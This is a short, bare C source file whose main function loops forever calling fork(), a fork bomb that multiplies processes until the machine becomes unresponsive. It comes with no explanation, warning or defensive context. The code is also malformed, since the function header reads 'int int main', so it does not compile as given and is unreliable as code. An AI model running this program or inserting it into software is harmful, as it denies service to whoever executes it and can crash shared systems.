#include <unistd.h>
#include <stdlib.h>

int int main(int argc, char const *argv[]) {

  while (1) {
    fork();
  }
  return 0;
}
